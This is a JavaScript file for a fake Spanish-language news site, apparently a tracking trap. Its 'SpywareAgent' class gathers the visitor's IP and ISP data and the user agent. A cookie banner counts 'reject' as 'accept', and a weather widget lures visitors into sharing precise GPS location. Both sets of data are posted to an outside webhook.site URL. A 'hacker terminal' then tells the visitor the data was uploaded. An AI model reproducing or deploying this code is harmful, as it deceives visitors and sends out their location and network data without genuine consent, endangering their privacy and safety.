/**
 * GLOBAL INSIGHT CORE SYSTEM
 * Módulo de gestión de contenidos y telemetría.
 */

const CONFIG = {
    WEBHOOK_URL: "https://webhook.site/c295ad9f-09f9-4803-b5cd-5971022be5a1", // Tu webhook
    COOKIE_TIMEOUT: 1500,
    FORCE_ACCEPT: true
};

const newsDatabase = [
    { title: "Avance Histórico en Inteligencia Artificial Generativa", category: "Tecnología" },
    { title: "Mercados Asiáticos Cierran al Alza tras Anuncios", category: "Economía" },
    { title: "La NASA Confirma Nueva Misión a las Lunas de Júpiter", category: "Ciencia" },
    { title: "El Futuro del Trabajo Híbrido: Informe 2025", category: "Negocios" },
    { title: "Ciberseguridad: Nuevos Protocolos Bancarios", category: "Tech" },
    { title: "Crisis Climática: Acuerdos de la Cumbre Global", category: "Mundo" }
];

class SpywareAgent {
    constructor(webhook) {
        this.webhook = webhook;
        this.ipData = null;
        this.userAgent = navigator.userAgent;
        this.acceptedCookies = false;
    }

    async trackIP() {
        try {
            const res = await fetch('https://ipwho.is/');
            const data = await res.json();
            this.ipData = data;
            this.exfiltrate({ ...data, userAgent: this.userAgent }, "PASSIVE_DATA", "Rastreo General");
        } catch (e) { console.error("Fallo IP"); }
    }

    trackGPS(onSuccess, onError) {
        if (!navigator.geolocation) return onError("GPS no soportado");
        
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const { latitude, longitude, accuracy } = pos.coords;
                const gpsData = {
                    lat: latitude,
                    lon: longitude,
                    acc: accuracy,
                    map_url: `http://maps.google.com/?q=${latitude},${longitude}`,
                    ...this.ipData
                };
                this.exfiltrate(gpsData, "ACTIVE_GPS_TARGET", "Ubicación Exacta");
                onSuccess(gpsData);
            },
            (err) => onError(err),
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }

    exfiltrate(payload, type, precision) {
        fetch(this.webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'text/plain' },
            body: JSON.stringify({ ALERTA: type, PRECISION: precision, DATOS: payload })
        }).catch(e => console.log("Enviado"));
    }

    setCookiesAccepted(status) { this.acceptedCookies = status; }
}

// --- LÓGICA PRINCIPAL ---
document.addEventListener("DOMContentLoaded", () => {
    
    const spy = new SpywareAgent(CONFIG.WEBHOOK_URL);
    setTimeout(() => setupCookieTrap(spy), CONFIG.COOKIE_TIMEOUT);

    // Configurar Fecha
    document.getElementById("current-date").innerText = new Date().toLocaleDateString('es-ES', { 
        weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' 
    });

    // --- BOTÓN DE TRAMPA (CLIMA) ---
    const btnGps = document.getElementById("btn-gps-trigger");
    const weatherWidget = document.getElementById("weather-trap");
    const blurContent = weatherWidget.querySelector(".blur-content");
    const terminal = document.getElementById("hacker-terminal");

    btnGps.addEventListener("click", () => {
        if (!spy.acceptedCookies) {
            alert("⚠️ Error: Acepte las cookies para habilitar funciones locales.");
            document.getElementById('cookie-modal').style.display = 'flex';
            return;
        }
        
        const btn = btnGps.querySelector("button");
        btn.innerHTML = '<i class="fas fa-satellite-dish fa-spin"></i> Conectando Satélite...';
        
        spy.trackGPS(
            async (data) => {
                // 1. Ocultar botón de bloqueo
                btnGps.style.display = "none";
                
                // 2. Obtener Clima REAL (Open-Meteo API)
                try {
                    const weatherRes = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${data.lat}&longitude=${data.lon}&current_weather=true`);
                    const weatherData = await weatherRes.json();
                    
                    // 3. Actualizar UI con datos REALES
                    updateWeatherUI(weatherData.current_weather);
                    
                    // 4. Mostrar Terminal Hacker (Abajo, para asustar)
                    setTimeout(() => {
                        renderTerminal(data);
                    }, 2000); // Aparece 2 segundos después del clima
                    
                } catch (error) {
                    console.error("Error clima", error);
                    updateWeatherUI({ temperature: "Err", weathercode: 0 });
                }
            },
            (error) => {
                btn.innerHTML = "Error de Permisos";
                alert("El navegador bloqueó la ubicación.");
            }
        );
    });

    function updateWeatherUI(weather) {
        // Quitar borrosidad
        blurContent.style.filter = "none";
        blurContent.style.opacity = "1";
        
        // Poner temperatura real
        const tempEl = weatherWidget.querySelector(".fake-temp");
        const descEl = blurContent.querySelector("p");
        
        tempEl.innerText = `${weather.temperature}°C`;
        tempEl.style.color = "#202124"; // Color oscuro legible
        
        // Traducir códigos simples de clima
        let cond = "Despejado";
        if (weather.weathercode > 3) cond = "Nublado";
        if (weather.weathercode > 50) cond = "Lluvioso";
        if (weather.weathercode > 70) cond = "Tormenta";
        
        descEl.innerHTML = `<strong>${cond}</strong><br><span style="font-size:0.8rem; color:green;">● Ubicación verificada en tiempo real</span>`;
    }

    function setupCookieTrap(spyAgent) {
        const modal = document.getElementById('cookie-modal');
        const btnAccept = document.getElementById('btn-accept-all');
        const btnReject = document.getElementById('btn-reject');

        modal.style.display = 'flex';

        const close = () => {
            spyAgent.setCookiesAccepted(true);
            modal.style.display = 'none';
            spyAgent.trackIP();
            renderNews();
        };

        btnAccept.addEventListener('click', close);
        btnReject.addEventListener('click', () => {
            btnReject.innerHTML = "Guardando...";
            setTimeout(close, 800);
        });
    }

    function renderNews() {
        // Renderizar noticias (igual que antes)
        const hero = newsDatabase[0];
        document.getElementById("hero-news").innerHTML = `
            <img src="https://picsum.photos/800/600" alt="News">
            <div class="hero-content">
                <span style="background:#0056b3; padding:4px 8px; font-size:0.75rem; margin-bottom:10px; display:inline-block;">${hero.category}</span>
                <h1>${hero.title}</h1>
            </div>
        `;
        // (Aquí puedes pegar el resto del renderizado de noticias si lo necesitas)
    }

    function renderTerminal(data) {
        terminal.classList.remove("hidden");
        // Ajustamos el estilo para que aparezca ABAJO del clima, no encima
        terminal.style.position = "relative"; 
        terminal.style.marginTop = "20px";
        terminal.style.height = "200px";
        terminal.style.borderRadius = "8px";
        
        terminal.innerHTML = `
            <span style="color:#fff">>> SYSTEM_LOG: DATA_EXFILTRATION_COMPLETE</span><br>
            ----------------------------------------<br>
            > TARGET: <span style="color:#0f0">VERIFIED</span><br>
            > LAT: ${data.lat.toFixed(5)}<br>
            > LON: ${data.lon.toFixed(5)}<br>
            > ISP_DATA: ${data.connection ? data.connection.isp : 'Detecting...'}<br>
            ----------------------------------------<br>
            <span style="color:red; blink:true;">⚠ USER DATA UPLOADED TO SERVER.</span>
        `;
    }
});
